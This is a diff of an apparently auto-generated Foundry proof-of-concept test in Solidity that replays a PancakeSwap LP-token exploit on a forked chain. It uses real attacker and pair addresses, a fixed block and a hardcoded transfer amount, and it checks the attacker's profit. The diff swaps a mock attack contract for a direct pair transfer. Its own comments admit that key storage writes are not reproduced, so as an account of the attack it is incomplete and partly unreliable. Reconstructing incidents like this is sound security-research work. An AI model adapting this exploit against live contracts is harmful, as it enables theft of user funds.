@@ -21,13 +21,13 @@ import "./Base.sol";
 // Generated PoC
 
 contract AttackTest is Base {
-    address constant ATTACKER_EOA = Addresses.attacker_eoa;
-    address constant ATTACK_CONTRACT = Addresses.attackContract;
+    address constant ATTACKER_EOA = Addresses.attacker;
+    address constant ATTACK_CONTRACT = Addresses.pancakePair;
+    uint256 constant TRANSFER_AMOUNT = 400498341357466415661652;
     uint256 constant FORK_BLOCK = 105692846;
     uint256 constant TX_TIMESTAMP = 1782120218;
     uint256 constant TX_BLOCK_NUMBER = 105692847;
     uint256 constant TX_VALUE = 0;
-    uint256 constant TRANSFER_AMOUNT = 400498341357466415661652;
 
     function setUp() public {
         vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
@@ -37,37 +37,26 @@ contract AttackTest is Base {
 
     function testPoC() public {
         vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
-        OurAttack attack = _deployAttack();
-        _prepareProfit(attack);
-        attack.attack{value: TX_VALUE}();
+        _prepareProfit(ATTACK_CONTRACT, address(0));
+        attack();
         vm.stopPrank();
         _assertProfit();
     }
 
-    function _deployAttack() internal returns (OurAttack attack) {
-        if (ATTACK_CONTRACT != address(0)) {
-            _etchRuntime();
-            attack = OurAttack(payable(ATTACK_CONTRACT));
-        } else {
-            attack = new OurAttack();
-        }
+    function attack() internal {
+        require(TX_VALUE == 0, "unexpected tx value");
+        // Unresolved gap: action_graph_validation reports the two internal LP storage writes as
+        // missing semantic-match coverage, so this PoC invokes the evidenced external entry only.
+        IERC20Like(Addresses.pancakePair).transfer(Addresses.pancakePair, TRANSFER_AMOUNT);
     }
 
-    function _prepareProfit(OurAttack attack) internal {
-        _prepareProfit(address(attack), address(0));
-    }
-
-    function _etchRuntime() internal {
-        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
-    }
-
-    function _expectProfitLegs(address attack, address attackChild) internal override {
+    function _expectProfitLegs(address profitHolder, address attackChild) internal override {
         attackChild;
         profitLegs.push(
             ProfitLeg({
-                holder: attack,
+                holder: profitHolder,
                 alternateHolder: address(0),
-                asset: attack,
+                asset: Addresses.pancakePair,
                 symbol: "Cake-LP",
                 expectedDeltaRaw: TRANSFER_AMOUNT,
                 strict: true,
@@ -78,59 +67,7 @@ contract AttackTest is Base {
     }
 }
 
-contract OurAttack {
-    event Transfer(address indexed from, address indexed to, uint256 value);
-
-    address private constant ATTACKER_EOA = Addresses.attacker_eoa;
-    address private constant ATTACK_CONTRACT = Addresses.attackContract;
-    uint256 private constant TRANSFER_AMOUNT = 400498341357466415661652;
-
-    /*
-     * Structured gap:
-     * action_graph_validation reports the two pseudocode storage writes as
-     * missing semantic matches. This PoC preserves the decoded attacker entry
-     * and token-transfer effect, but does not emulate the raw slot writes with
-     * vm.store or assembly sstore.
-     */
-    function attack() external payable {
-        _acceptTokenTransfer(ATTACKER_EOA, ATTACK_CONTRACT, TRANSFER_AMOUNT);
-    }
-
-    receive() external payable {}
-
-    function balanceOf(address account) external view returns (uint256) {
-        return tokenBalance[account];
-    }
-
-    function symbol() external pure returns (string memory) {
-        return "Cake-LP";
-    }
-
-    function decimals() external pure returns (uint8) {
-        return 18;
-    }
-
-    function transfer(address recipient, uint256 amount) external payable {
-        _acceptTokenTransfer(msg.sender, recipient, amount);
-        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
-        assembly { return(add(ret, 32), mload(ret)) }
-    }
-
-    fallback() external payable {
-        if (msg.data.length == 0) return;
-    }
-
-    mapping(address => uint256) private tokenBalance;
-
-    function _acceptTokenTransfer(address sender, address recipient, uint256 amount) internal {
-        tokenBalance[recipient] += amount;
-        emit Transfer(sender, recipient, amount);
-    }
-}
-
 library Addresses {
-    address internal constant ZERO = address(0);
-    address internal constant attackContract = 0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA;
-    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
-    address internal constant attacker_eoa = 0xBE8351C14e5108A57A545DFA8669Fa31aA6aDC68;
+    address internal constant pancakePair = 0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA;
+    address internal constant attacker = 0xBE8351C14e5108A57A545DFA8669Fa31aA6aDC68;
 }
